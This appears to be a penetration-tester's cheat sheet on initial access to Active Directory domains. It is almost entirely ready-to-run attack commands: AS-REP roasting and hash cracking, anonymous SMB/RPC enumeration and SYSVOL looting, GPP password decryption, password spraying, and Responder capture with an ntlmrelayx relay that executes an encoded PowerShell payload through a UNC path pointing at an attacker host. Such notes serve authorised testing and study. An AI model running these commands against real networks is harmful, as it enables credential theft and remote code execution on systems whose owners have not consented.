---
title: AD Initial Access
type: note
tab: Active Directory
inputs: [Username, Password]
outputs: [Hash, Password, Username]
tags: [ActiveDirectory, Kerberos, SMB, Enumeration, Exploitation]
---

# AD Initial Access

## WHY

Get the first valid domain credential or crackable hash.

## WHEN

- You have a username list.
- Null SMB/RPC leaks shares or users.
- You can safely test common passwords after checking lockout policy.

## NEXT

- Got valid creds: [[Post_Creds_Enum]]
- Got hash: [[../Credentials/Hash Crack]]

## Commands

### ASREPRoast

#Username #Kerberos #ActiveDirectory #Exploitation
Request ASREP hashes for users without pre-auth.

```sh
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -no-pass -dc-ip <DC_IP> -outputfile asrep.hashes
```

#Username #Kerberos #ActiveDirectory #Exploitation
Request ASREP hash for a single known user.

```sh
impacket-GetNPUsers <DOMAIN>/<USER> -request -no-pass -dc-ip <DC_IP> -outputfile asrep.hashes
```

#Hash #Crack #Kerberos #ActiveDirectory
Crack ASREP hash.

```sh
hashcat -m 18200 asrep.hashes <WORDLIST>
```

### Null Session To SYSVOL

#SMB #ActiveDirectory #Enumeration
Check null session.

```sh
nxc smb <DC_IP> -u '' -p '' --shares
```

#SMB #ActiveDirectory #Looting
Access SYSVOL anonymously if allowed.

```sh
smbclient //<DC_IP>/SYSVOL -N
```

#ProtectedFile #Crack #ActiveDirectory
Decrypt old GPP cpassword if found.

```sh
gpp-decrypt <CPASSWORD>
```

### Password Spray

#Username #SMB #ActiveDirectory #Enumeration
Check password policy before spraying.

```sh
nxc smb <DC_IP> -u <USER> -p '<PASS>' --pass-pol
```

#Username #Password #SMB #ActiveDirectory #Exploitation
Spray one password across users.

```sh
nxc smb <DC_IP> -u users.txt -p '<PASSWORD>' --continue-on-success
```

### SMB/RPC User Enum

#RPC #ActiveDirectory #Enumeration
Try anonymous RPC user enum.

```sh
rpcclient -U '' -N <DC_IP> -c 'enumdomusers'
```

### Responder / NTLM Relay

#NTLM #ActiveDirectory #Exploitation
Capture Net-NTLMv2 with Responder and a coerced UNC path.

```sh
# Kali
sudo responder -I <IFACE> -v

# Victim shell or injected input
dir \\<LHOST>\test
```

#NTLM #SMB #ActiveDirectory #Exploitation
Relay captured Net-NTLMv2 when SMB signing is disabled.

```sh
# Check signing on candidate targets.
nxc smb <TARGET_SUBNET>

# Relay to a target and execute a payload.
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_IP> -c "powershell -e <BASE64_PAYLOAD>"

# Trigger authentication from a victim.
dir \\<LHOST>\test
```

## Gotchas

- Do not spray until lockout policy is known.
- ASREPRoast needs a username list but not valid creds.
- SYSVOL may contain scripts, XML, passwords, or deployment artifacts.
